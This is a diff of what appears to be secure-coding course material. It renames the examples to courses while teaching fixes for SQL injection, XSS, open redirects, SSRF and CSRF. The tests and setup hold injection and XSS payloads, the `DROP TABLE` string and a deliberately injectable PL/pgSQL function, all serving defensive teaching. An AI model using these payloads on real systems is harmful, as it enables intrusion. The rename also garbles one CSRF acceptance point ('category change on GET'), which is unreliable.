 - Escaping quotes (`'` → `''`) and concatenating. It works until someone finds an edge case (backslashes, encodings). Parameters remove the whole class of bug.
-- Passing the sort key straight through after a regex like `^[a-z_]+$`. That still allows sorting by any column, including `contractor_pan`, which leaks data through ordering.
+- Passing the sort key straight through after a regex like `^[a-z_]+$`. That still allows sorting by any column, including `instructor_pan`, which leaks data through ordering.
 - Forgetting to escape `LIKE` wildcards, so `%` returns every row through an expensive scan.
 :::
 
 :::exercise id=m14-owasp-ex2 difficulty=beginner kind=code title="Encode output and refuse open redirects"
-Implement two helpers for a server-rendered login and comments page:
+Implement two helpers for a server-rendered login and course-reviews page:
 
 1. `SafeOutput.CommentHtml(author, body)` returns `<p><b>{author}</b>: {body}</p>` with both values HTML-encoded.
-2. `SafeOutput.IsLocalReturnUrl(url)` returns true only for local paths such as `/projects/42?tab=docs`. It returns false for absolute URLs, protocol-relative URLs (`//evil.example`), backslash tricks (`/\evil.example`), `javascript:` URLs and empty strings.
+2. `SafeOutput.IsLocalReturnUrl(url)` returns true only for local paths such as `/courses/42?tab=syllabus`. It returns false for absolute URLs, protocol-relative URLs (`//evil.example`), backslash tricks (`/\evil.example`), `javascript:` URLs and empty strings.
 ::acceptance
 - `<script>alert(1)</script>` in the body is rendered as text (`&lt;script&gt;`).
 - Quotes in the author are encoded, so they cannot break out of an attribute later.
-- `/projects/42` is local. `https://evil.example`, `//evil.example`, `/\evil.example` and `javascript:alert(1)` are not.
+- `/courses/42` is local. `https://evil.example`, `//evil.example`, `/\evil.example` and `javascript:alert(1)` are not.
 ::hint
 `System.Text.Encodings.Web.HtmlEncoder.Default.Encode(...)` does the HTML encoding.
 ::hint
@@ -874,7 +875,7 @@ public class SafeOutputTests
         Assert.DoesNotContain("\"", SafeOutput.CommentHtml("x\" onmouseover=\"alert(1)", "ok").Replace("<p><b>", "").Replace("</b>: ok</p>", ""));
 
     [Theory]
-    [InlineData("/projects/42?tab=docs", true)]
+    [InlineData("/courses/42?tab=syllabus", true)]
     [InlineData("/", true)]
     [InlineData("https://evil.example/login", false)]
     [InlineData("//evil.example", false)]
@@ -915,13 +916,13 @@ Implement `WebhookDestinationPolicy.Check(uri, resolvedAddresses)`. It returns `
 ::requirements
 - Only `https` on port 443.
 - No user info in the URL (`https://partner.example@evil.example/`).
-- Host must equal an allowed host, or end with an allowed suffix that starts with a dot (`.contractor.example`).
+- Host must equal an allowed host, or end with an allowed suffix that starts with a dot (`.institute.example`).
 - Every resolved address must be public. Block loopback, private (RFC 1918), link-local (`169.254.0.0/16`, `fe80::/10`), carrier-grade NAT (`100.64.0.0/10`), unique-local IPv6 (`fc00::/7`), `0.0.0.0/8` and IPv4-mapped IPv6 forms of all of these. An empty address list is not allowed.
 ::acceptance
-- `https://hooks.contractor.example/x` resolving to `20.40.1.7` is allowed.
+- `https://hooks.institute.example/x` resolving to `20.40.1.7` is allowed.
 - The same URL resolving to `169.254.169.254`, `10.1.2.3` or `::ffff:127.0.0.1` is rejected with `address`.
 - `http://` is rejected with `scheme`, port 8443 with `port`.
-- `https://evilcontractor.example` is rejected with `host` (a suffix match must respect the dot).
+- `https://evilinstitute.example` is rejected with `host` (a suffix match must respect the dot).
 ::hint
 Check cheap string rules first (scheme, port, user info, host), then addresses.
 ::hint
@@ -929,7 +930,7 @@ Check cheap string rules first (scheme, port, user info, host), then addresses.
 ::hint
 Normalise `::ffff:a.b.c.d` with `ip.IsIPv4MappedToIPv6 ? ip.MapToIPv4() : ip` before testing IPv4 ranges.
 ::hint
-For the suffix rule, `".contractor.example"` must match `hooks.contractor.example` but not `evilcontractor.example`. Keep the leading dot in the comparison.
+For the suffix rule, `".institute.example"` must match `hooks.institute.example` but not `evilinstitute.example`. Keep the leading dot in the comparison.
 ::starter
 ```csharp file=WebhookDestinationPolicy.cs
 using System;
@@ -954,12 +955,12 @@ using Xunit;
 
 public class WebhookDestinationPolicyTests
 {
-    private static readonly WebhookDestinationPolicy Policy = new(new[] { ".contractor.example", "api.partner.example" });
+    private static readonly WebhookDestinationPolicy Policy = new(new[] { ".institute.example", "api.partner.example" });
     private static IPAddress[] Ips(params string[] s) => s.Select(IPAddress.Parse).ToArray();
 
     [Fact]
     public void Public_allowed_host_passes() =>
-        Assert.Null(Policy.Check(new Uri("https://hooks.contractor.example/x"), Ips("20.40.1.7")));
+        Assert.Null(Policy.Check(new Uri("https://hooks.institute.example/x"), Ips("20.40.1.7")));
 
     [Theory]
     [InlineData("169.254.169.254")]
@@ -970,7 +971,7 @@ public class WebhookDestinationPolicyTests
     [InlineData("fd00::5")]
     [InlineData("::1")]
     public void Internal_addresses_are_blocked(string ip) =>
-        Assert.Equal("address", Policy.Check(new Uri("https://hooks.contractor.example/x"), Ips(ip)));
+        Assert.Equal("address", Policy.Check(new Uri("https://hooks.institute.example/x"), Ips(ip)));
 
     [Fact]
     public void One_bad_address_among_many_is_blocked() =>
@@ -983,7 +984,7 @@ public class WebhookDestinationPolicyTests
     [Fact] public void Http_is_rejected() => Assert.Equal("scheme", Policy.Check(new Uri("http://api.partner.example/"), Ips("20.40.1.7")));
     [Fact] public void Other_port_is_rejected() => Assert.Equal("port", Policy.Check(new Uri("https://api.partner.example:8443/"), Ips("20.40.1.7")));
     [Fact] public void Userinfo_is_rejected() => Assert.Equal("userinfo", Policy.Check(new Uri("https://api.partner.example@evil.example/"), Ips("20.40.1.7")));
-    [Fact] public void Suffix_respects_dot() => Assert.Equal("host", Policy.Check(new Uri("https://evilcontractor.example/"), Ips("20.40.1.7")));
+    [Fact] public void Suffix_respects_dot() => Assert.Equal("host", Policy.Check(new Uri("https://evilinstitute.example/"), Ips("20.40.1.7")));
 }
 ```
 ::solution
@@ -1029,7 +1030,7 @@ public sealed class WebhookDestinationPolicy
 In production, call the address part from `SocketsHttpHandler.ConnectCallback` with the addresses you are about to connect to, as in the lesson's `SsrfSafeHandler`. If you check in one place and let `HttpClient` resolve again later, DNS rebinding defeats you.
 ::mistakes
 - Allowing the request when *any* address is public. An attacker's DNS can return one public and one private address.
-- Using `host.EndsWith("contractor.example")` without the dot.
+- Using `host.EndsWith("institute.example")` without the dot.
 - Forgetting IPv6, or the IPv4-mapped form `::ffff:127.0.0.1`.
 - Following redirects after the check.
 ::extensions
@@ -1037,88 +1038,88 @@ Add per-tenant verified domains: a tenant can only register hosts it proved it c
 :::
 
 :::exercise id=m14-owasp-ex4 difficulty=intermediate kind=sql title="Fix an injectable PL/pgSQL search function"
-The setup creates `projects` and an unsafe function. Write a safe replacement, `find_projects(p_sort text, p_term text)`, that returns `id`, `name` and `state` for projects whose name contains `p_term` (case-insensitive), ordered by the column named in `p_sort` and then by `id`. Then return, in one query, the rows from two calls: a normal one and an injection attempt.
+The setup creates `courses` and an unsafe function. Write a safe replacement, `find_courses(p_sort text, p_term text)`, that returns `id`, `name` and `category` for courses whose name contains `p_term` (case-insensitive), ordered by the column named in `p_sort` and then by `id`. Then return, in one query, the rows from two calls: a normal one and an injection attempt.
 
 ```sql
-SELECT 'normal' AS call, id, name FROM find_projects('budget_inr', 'bridge')
+SELECT 'normal' AS call, id, name FROM find_courses('fee_inr', 'python')
 UNION ALL
-SELECT 'attack', id, name FROM find_projects('name', $$x' OR true --$$);
+SELECT 'attack', id, name FROM find_courses('name', $$x' OR true --$$);
 ```
 ::requirements
 - Use `format()` with `%I` for the sort column and `EXECUTE ... USING` for the search term.
-- Only allow sorting by `name`, `state` or `budget_inr`. Any other value must raise an exception.
+- Only allow sorting by `name`, `category` or `fee_inr`. Any other value must raise an exception.
 - The attack call must return no rows.
 ::acceptance
-- The normal call returns the three bridge projects.
+- The normal call returns the three Python courses, cheapest first.
 - The attack call returns zero rows (the input is treated as a literal search string).
-- `find_projects('(SELECT 1/0)', 'x')` raises an error that you control, not a division by zero.
+- `find_courses('(SELECT 1/0)', 'x')` raises an error that you control, not a division by zero.
 ::hint
 `EXECUTE format('SELECT ... ORDER BY %I, id', p_sort) USING p_term` keeps the identifier quoted and the value out of the SQL text.
 ::hint
 Inside the dynamic SQL, refer to the value as `$1`: `WHERE name ILIKE '%' || $1 || '%'`.
 ::hint
-Check the allow-list first: `IF p_sort NOT IN ('name', 'state', 'budget_inr') THEN RAISE EXCEPTION ...`.
+Check the allow-list first: `IF p_sort NOT IN ('name', 'category', 'fee_inr') THEN RAISE EXCEPTION ...`.
 ::hint
-`RETURNS TABLE (id bigint, name text, state text)` plus `RETURN QUERY EXECUTE ...`. The dynamic query must return exactly those columns, in that order.
+`RETURNS TABLE (id bigint, name text, category text)` plus `RETURN QUERY EXECUTE ...`. The dynamic query must return exactly those columns, in that order.
 ::setup
 ```sql
-CREATE TABLE projects (
-  id bigint PRIMARY KEY, name text NOT NULL, state text NOT NULL, budget_inr bigint NOT NULL
+CREATE TABLE courses (
+  id bigint PRIMARY KEY, name text NOT NULL, category text NOT NULL, fee_inr bigint NOT NULL
 );
-INSERT INTO projects VALUES
-  (1, 'Bridge over Ghaghara at Ayodhya', 'UP', 4200000000),
-  (2, 'NH-27 widening package 4', 'BR', 7800000000),
-  (3, 'Ring road bridge, Guwahati', 'AS', 2900000000),
-  (4, 'Smart city drainage phase 2', 'MP', 640000000),
-  (5, 'Rail over-bridge, Nagpur', 'MH', 910000000);
-CREATE FUNCTION find_projects_unsafe(p_sort text, p_term text)
-RETURNS TABLE (id bigint, name text, state text) LANGUAGE plpgsql AS $fn$
+INSERT INTO courses VALUES
+  (1, 'Python for Data Analysis', 'data', 4999),
+  (2, 'Web APIs with ASP.NET Core', 'programming', 7999),
+  (3, 'Python Basics for School Students', 'programming', 1499),
+  (4, 'Spoken English in 30 Days', 'language', 999),
+  (5, 'Machine Learning with Python', 'data', 9999);
+CREATE FUNCTION find_courses_unsafe(p_sort text, p_term text)
+RETURNS TABLE (id bigint, name text, category text) LANGUAGE plpgsql AS $fn$
 BEGIN
   RETURN QUERY EXECUTE
-    'SELECT id, name, state FROM projects WHERE name ILIKE ''%' || p_term || '%'' ORDER BY ' || p_sort;
+    'SELECT id, name, category FROM courses WHERE name ILIKE ''%' || p_term || '%'' ORDER BY ' || p_sort;
 END
 $fn$;
 ```
 ::check
 ```sql
-CREATE FUNCTION find_projects(p_sort text, p_term text)
-RETURNS TABLE (id bigint, name text, state text) LANGUAGE plpgsql AS $fn$
+CREATE FUNCTION find_courses(p_sort text, p_term text)
+RETURNS TABLE (id bigint, name text, category text) LANGUAGE plpgsql AS $fn$
 BEGIN
-  IF p_sort NOT IN ('name', 'state', 'budget_inr') THEN
+  IF p_sort NOT IN ('name', 'category', 'fee_inr') THEN
     RAISE EXCEPTION 'unsupported sort column %', p_sort;
   END IF;
   RETURN QUERY EXECUTE format(
-    'SELECT p.id, p.name, p.state FROM projects p WHERE p.name ILIKE ''%%'' || $1 || ''%%'' ORDER BY p.%I, p.id', p_sort)
+    'SELECT p.id, p.name, p.category FROM courses p WHERE p.name ILIKE ''%%'' || $1 || ''%%'' ORDER BY p.%I, p.id', p_sort)
   USING p_term;
 END
 $fn$;
-SELECT 'normal' AS call, id, name FROM find_projects('budget_inr', 'bridge')
+SELECT 'normal' AS call, id, name FROM find_courses('fee_inr', 'python')
 UNION ALL
-SELECT 'attack', id, name FROM find_projects('name', $$x' OR true --$$);
+SELECT 'attack', id, name FROM find_courses('name', $$x' OR true --$$);
 ```
 ::solution
 ```sql
-CREATE FUNCTION find_projects(p_sort text, p_term text)
-RETURNS TABLE (id bigint, name text, state text) LANGUAGE plpgsql AS $fn$
+CREATE FUNCTION find_courses(p_sort text, p_term text)
+RETURNS TABLE (id bigint, name text, category text) LANGUAGE plpgsql AS $fn$
 BEGIN
-  IF p_sort NOT IN ('name', 'state', 'budget_inr') THEN
+  IF p_sort NOT IN ('name', 'category', 'fee_inr') THEN
     RAISE EXCEPTION 'unsupported sort column %', p_sort;
   END IF;
   RETURN QUERY EXECUTE format(
-    'SELECT p.id, p.name, p.state FROM projects p WHERE p.name ILIKE ''%%'' || $1 || ''%%'' ORDER BY p.%I, p.id', p_sort)
+    'SELECT p.id, p.name, p.category FROM courses p WHERE p.name ILIKE ''%%'' || $1 || ''%%'' ORDER BY p.%I, p.id', p_sort)
   USING p_term;
 END
 $fn$;
-SELECT 'normal' AS call, id, name FROM find_projects('budget_inr', 'bridge')
+SELECT 'normal' AS call, id, name FROM find_courses('fee_inr', 'python')
 UNION ALL
-SELECT 'attack', id, name FROM find_projects('name', $$x' OR true --$$);
+SELECT 'attack', id, name FROM find_courses('name', $$x' OR true --$$);
 ```
 
 Three things make it safe. `USING p_term` passes the term as a parameter (`$1`), so quotes in it are just characters. `%I` quotes the identifier, so even if the allow-list were missing, `(SELECT 1/0)` would become a quoted (and non-existent) column name rather than an expression. And the allow-list stops sorting by columns you didn't intend to expose. Inside `format`, a literal `%` must be written `%%`. The table alias `p` avoids a clash between the output column names and the table columns.
 ::mistakes
 - Using `quote_literal` and concatenation. It works, but `USING` is simpler and harder to get wrong.
 - Using `%s` instead of `%I` for the column name, which inserts it unquoted.
-- Forgetting that `RETURNS TABLE (id ...)` declares variables named `id`, `name` and `state`, which makes unqualified column references ambiguous in static SQL.
+- Forgetting that `RETURNS TABLE (id ...)` declares variables named `id`, `name` and `category`, which makes unqualified column references ambiguous in static SQL.
 :::
 
 :::exercise id=m14-owasp-ex5 difficulty=intermediate kind=written title="CSRF review of a cookie-authenticated SPA"
@@ -1133,7 +1134,7 @@ A React single-page app on `app.example.in` calls an ASP.NET Core API on `api.ex
 Explain which findings allow CSRF and why, and give a prioritised fix list.
 ::acceptance
 - Explains that CORS limits reading responses, not sending simple requests.
-- Identifies 3 (form-encoded POST is a simple request, sent cross-site with the cookie) and 4 (state change on GET) as directly exploitable.
+- Identifies 3 (form-encoded POST is a simple request, sent cross-site with the cookie) and 4 (category change on GET) as directly exploitable.
 - Notes that `app` and `api` on `example.in` are the *same site*, so `SameSite=Lax` would work and `None` is unnecessary.
 - Proposes antiforgery tokens in a header for unsafe methods, JSON-only content type, and removal of the GET.
 ::hint
@@ -1166,17 +1167,17 @@ Option: move to a backend-for-frontend on the same origin as the SPA, which simp
 :::
 
 :::exercise id=m14-owasp-ex6 difficulty=advanced kind=code title="Compile a user-built report filter into safe SQL"
-The MIS team wants a report screen where users build filters like `state = 'BR' AND (budget > 1,00,00,00,000 OR name contains "bridge")`. The UI sends a tree. Implement `FilterCompiler.Compile(node)` that turns the tree into a SQL `WHERE` fragment plus parameters.
+The marketing team wants a report screen where users build filters like `category = 'data' AND (fee > 4,999 OR name contains "python")`. The UI sends a tree. Implement `FilterCompiler.Compile(node)` that turns the tree into a SQL `WHERE` fragment plus parameters.
 ::requirements
-- Fields are allow-listed: `state` → `state`, `budget` → `budget_inr`, `name` → `name`, `district` → `district`. Unknown fields throw `ArgumentException`.
+- Fields are allow-listed: `category` → `category`, `fee` → `fee_inr`, `name` → `name`, `city` → `city`. Unknown fields throw `ArgumentException`.
 - Operators: `eq` (`=`), `neq` (`<>`), `gt` (`>`), `lt` (`<`), `contains` (`ILIKE`, value `%escaped%`), `in` (`= ANY(@pN)`, value is the array as given). Unknown operators throw `ArgumentException`.
 - Parameters are named `p0`, `p1`, … in the order conditions appear (depth-first, left to right).
 - Groups render as `(` + children joined with ` AND ` or ` OR ` + `)`. A condition renders as `col op @pN`.
 - To prevent abuse, reject trees deeper than 4 levels (the root is depth 1) or with more than 20 conditions, with `ArgumentException`. Empty groups are also rejected.
 ::acceptance
-- The example tree compiles to `(state = @p0 AND (budget_inr > @p1 OR name ILIKE @p2))` with values `BR`, `1000000000`, `%bridge%`.
-- A field named `budget_inr; DROP TABLE x` throws, as does an operator `like`.
-- `in` produces `district = ANY(@p0)`.
+- The example tree compiles to `(category = @p0 AND (fee_inr > @p1 OR name ILIKE @p2))` with values `data`, `4999`, `%python%`.
+- A field named `fee_inr; DROP TABLE x` throws, as does an operator `like`.
+- `in` produces `city = ANY(@p0)`.
 - A 5-level-deep tree throws.
 ::hint
 This is a tree walk. Write one recursive method that returns SQL text and appends to a shared parameter list.
@@ -1227,14 +1228,14 @@ public class FilterCompilerTests
     [Fact]
     public void Example_tree_compiles()
     {
-        var tree = And(new Condition("state", "eq", "BR"),
-                       Or(new Condition("budget", "gt", 1_000_000_000L), new Condition("name", "contains", "bridge")));
+        var tree = And(new Condition("category", "eq", "data"),
+                       Or(new Condition("fee", "gt", 4_999L), new Condition("name", "contains", "python")));
         var f = FilterCompiler.Compile(tree);
-        Assert.Equal("(state = @p0 AND (budget_inr > @p1 OR name ILIKE @p2))", f.Sql);
+        Assert.Equal("(category = @p0 AND (fee_inr > @p1 OR name ILIKE @p2))", f.Sql);
         Assert.Equal(new[] { "p0", "p1", "p2" }, f.Parameters.Select(p => p.Key).ToArray());
-        Assert.Equal("BR", f.Parameters[0].Value);
-        Assert.Equal(1_000_000_000L, f.Parameters[1].Value);
-        Assert.Equal("%bridge%", f.Parameters[2].Value);
+        Assert.Equal("data", f.Parameters[0].Value);
+        Assert.Equal(4_999L, f.Parameters[1].Value);
+        Assert.Equal("%python%", f.Parameters[2].Value);
     }
 
     [Fact]
@@ -1244,13 +1245,13 @@ public class FilterCompilerTests
     [Fact]
     public void In_uses_any()
     {
-        var f = FilterCompiler.Compile(new Condition("district", "in", new[] { "Patna", "Gaya" }));
-        Assert.Equal("district = ANY(@p0)", f.Sql);
+        var f = FilterCompiler.Compile(new Condition("city", "in", new[] { "Pune", "Indore" }));
+        Assert.Equal("city = ANY(@p0)", f.Sql);
     }
 
     [Fact]
     public void Unknown_field_throws() =>
-        Assert.Throws<ArgumentException>(() => FilterCompiler.Compile(new Condition("budget_inr; DROP TABLE x", "eq", 1)));
+        Assert.Throws<ArgumentException>(() => FilterCompiler.Compile(new Condition("fee_inr; DROP TABLE x", "eq", 1)));
 
     [Fact]
     public void Unknown_operator_throws() =>
@@ -1259,7 +1260,7 @@ public class FilterCompilerTests
     [Fact]
     public void Too_deep_throws()
     {
-        FilterNode n = new Condition("state", "eq", "BR");
+        FilterNode n = new Condition("category", "eq", "data");
         for (var i = 0; i < 4; i++) n = And(n);
         Assert.Throws<ArgumentException>(() => FilterCompiler.Compile(n));
     }
@@ -1267,15 +1268,15 @@ public class FilterCompilerTests
     [Fact]
     public void Depth_four_is_allowed()
     {
-        FilterNode n = new Condition("state", "eq", "BR");
+        FilterNode n = new Condition("category", "eq", "data");
         for (var i = 0; i < 3; i++) n = And(n);
-        Assert.Equal("(((state = @p0)))", FilterCompiler.Compile(n).Sql);
+        Assert.Equal("(((category = @p0)))", FilterCompiler.Compile(n).Sql);
     }
 
     [Fact]
     public void Too_many_conditions_throws() =>
         Assert.Throws<ArgumentException>(() => FilterCompiler.Compile(
-            Or(Enumerable.Range(0, 21).Select(i => (FilterNode)new Condition("state", "eq", "S" + i)).ToArray())));
+            Or(Enumerable.Range(0, 21).Select(i => (FilterNode)new Condition("category", "eq", "S" + i)).ToArray())));
 
     [Fact]
     public void Empty_group_throws() =>
@@ -1301,7 +1302,7 @@ public static class FilterCompiler
 
     private static readonly Dictionary<string, string> Columns = new(StringComparer.Ordinal)
     {
-        ["state"] = "state", ["budget"] = "budget_inr", ["name"] = "name", ["district"] = "district",
+        ["category"] = "category", ["fee"] = "fee_inr", ["name"] = "name", ["city"] = "city",
     };
 
     private static readonly Dictionary<string, string> Operators = new(StringComparer.Ordinal)
@@ -1342,7 +1343,7 @@ public static class FilterCompiler
 }
 ```
 
-Every piece of SQL text comes from one of two dictionaries or from fixed punctuation. Limits on depth and condition count protect the database from a user (or script) that sends a 10,000-condition filter: an expensive query is a denial-of-service vector too. In production you would also validate value *types* per field (budget must be a number), so a type error becomes a `400` instead of a database exception.
+Every piece of SQL text comes from one of two dictionaries or from fixed punctuation. Limits on depth and condition count protect the database from a user (or script) that sends a 10,000-condition filter: an expensive query is a denial-of-service vector too. In production you would also validate value *types* per field (fee must be a number), so a type error becomes a `400` instead of a database exception.
 ::alternatives
 EF Core with LINQ expressions (`query.Where(BuildExpression(tree))`) gives the same safety, because EF parameterizes constants. The tree-to-expression compiler is more code but keeps you in typed C#. A third option is a fixed set of named report filters, which is simpler and often enough.
 ::mistakes
@@ -1371,7 +1372,7 @@ public class SecurityHeaderTests(WebApplicationFactory<Program> factory) : IClas
     public async Task Form_post_without_token_is_rejected()
     {
         var client = factory.CreateClient(); // signed in through a test auth handler
-        var res = await client.PostAsync("/projects/42/archive",
+        var res = await client.PostAsync("/courses/42/unpublish",
             new FormUrlEncodedContent(new Dictionary<string, string> { ["reason"] = "dup" }));
         Assert.Equal(HttpStatusCode.BadRequest, res.StatusCode);
     }
@@ -1388,7 +1389,7 @@ public class SecurityHeaderTests(WebApplicationFactory<Program> factory) : IClas
 
 - **Instance-metadata SSRF** is a recurring cause of cloud data breaches. Attackers use a URL-fetching feature to reach the metadata endpoint, obtain the machine's credentials, and read storage. Token-protected metadata access and least-privilege machine identities exist largely because of this pattern.
 - **Government and utility portals** in many countries, India included, often have legacy pages with string-built SQL and `Html.Raw` rendering. Security audits by empanelled auditors routinely list SQL injection and XSS before go-live, and the fix list in this lesson is what they expect.
-- **Frameworks moved the defaults.** ASP.NET Core's Razor encodes by default, antiforgery is on for forms, cookies default to `SameSite=Lax` in browsers, and EF Core parameterizes LINQ. Most modern findings come from the places where developers opt out.
+- **Frameworks moved the defaults.** ASP.NET Core's Razor encodes by default, Razor Pages validate antiforgery tokens on forms, the cookie authentication handler sets `SameSite=Lax`, and EF Core parameterizes LINQ. Most modern findings come from the places where developers opt out.
 - **Webhook platforms** (payment gateways, Git hosting, chat tools) deliver webhooks from dedicated egress workers with IP checks and no redirects, for the same SSRF reasons described here.
 
 ## Interview questions
@@ -1465,18 +1466,18 @@ A developer "fixes" SQL injection by replacing every `'` with `''` before concat
 - [ ] Put a WAF in front instead.
 > Parameters remove the whole class of bug by keeping values out of the SQL text. Keyword blocklists break real data and are bypassable.
 ::q single
-An endpoint takes `?sort=budget_inr` and builds `ORDER BY {sort}`. The team already uses parameters for all values. What should they do?
+An endpoint takes `?sort=fee_inr` and builds `ORDER BY {sort}`. The team already uses parameters for all values. What should they do?
 - [ ] Pass `sort` as a parameter too.
 - [x] Map allowed sort keys to fixed SQL fragments and reject everything else.
 - [ ] Quote it with double quotes and concatenate.
 - [ ] Nothing: ORDER BY cannot be exploited.
 > Parameters can't be identifiers. ORDER BY accepts expressions, including subqueries, so an allow-list is required.
 ::q single
-Inspection comments are rendered with `@Html.Raw(comment.Body)` so that line breaks show. A tester posts `<img src=x onerror=alert(1)>`. What is the best fix?
-- [ ] Strip `<script>` tags from comments when saving.
-- [x] Render with `@comment.Body` (encoded) and use CSS `white-space: pre-line` for line breaks, plus a CSP.
+Course reviews are rendered with `@Html.Raw(review.Body)` so that line breaks show. A tester posts `<img src=x onerror=alert(1)>`. What is the best fix?
+- [ ] Strip `<script>` tags from reviews when saving.
+- [x] Render with `@review.Body` (encoded) and use CSS `white-space: pre-line` for line breaks, plus a CSP.
 - [ ] Mark the session cookie HttpOnly.
-- [ ] Validate that comments contain only letters and digits.
+- [ ] Validate that reviews contain only letters and digits.
 > The payload doesn't contain `<script>`. HttpOnly limits cookie theft but not XSS itself. Encoding plus CSS solves the real requirement.
 ::q multi
 Which of these are effective CSRF defences for a cookie-authenticated web app? (Select all that apply.)
